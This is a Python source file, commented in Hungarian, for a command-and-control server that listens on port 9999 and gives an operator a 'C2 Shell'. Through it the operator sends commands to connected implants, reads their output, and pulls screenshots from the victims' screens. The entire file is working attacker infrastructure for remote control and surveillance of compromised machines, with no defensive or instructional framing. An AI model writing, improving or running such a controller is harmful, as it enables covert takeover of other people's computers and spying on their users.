import socket
import threading
import datetime

BIND_IP = "0.0.0.0"
BIND_PORT = 9999

def receive_file(sock, filename):
    """Bináris fájl fogadása a hálózaton keresztül."""
    try:
        # Először fogadjuk a méretet (max 1024 bájtban)
        file_size_str = sock.recv(1024).decode()
        if not file_size_str.isdigit():
            print("[-] Hiba: Nem érkezett érvényes fájlméret.")
            return
        
        file_size = int(file_size_str)
        sock.send(b"ACK") # Jelezzük, hogy készen állunk az adatra

        received_bytes = 0
        with open(filename, "wb") as f:
            while received_bytes < file_size:
                # 4KB-os csomagokban fogadjuk
                chunk = sock.recv(4096)
                if not chunk:
                    break
                f.write(chunk)
                received_bytes += len(chunk)
        
        print(f"[+] Képernyőkép elmentve: {filename} ({file_size} bytes)")
    except Exception as e:
        print(f"[-] Hiba a fájl fogadásakor: {e}")

def handle_client(client_socket, address):
    print(f"\n[+] Kapcsolat: {address}")
    
    while True:
        try:
            command = input(f"C2 Shell ({address[0]})> ")
            
            if not command.strip(): continue
            
            # Parancs küldése
            client_socket.send(command.encode())
            
            if command == "exit":
                break
            
            # --- SPECIÁLIS PARANCS: SCREENSHOT ---
            if command == "screenshot":
                print("[*] Képernyőkép fogadása folyamatban...")
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                receive_file(client_socket, f"screenshot_{timestamp}.png")
            
            # --- NORMÁL PARANCSOK ---
            else:
                response = client_socket.recv(4096).decode(errors='replace')
                print(response)
                
        except Exception as e:
            print(f"[-] Kapcsolat megszakadt: {e}")
            break
            
    client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((BIND_IP, BIND_PORT))
    server.listen(5)
    print(f"--- [ C2 SERVER + MULTIMEDIA ] ---")
    print(f"[*] Figyelés a {BIND_PORT} porton...")
    
    while True:
        client, addr = server.accept()
        t = threading.Thread(target=handle_client, args=(client, addr))
        t.start()

if __name__ == "__main__":
    start_server()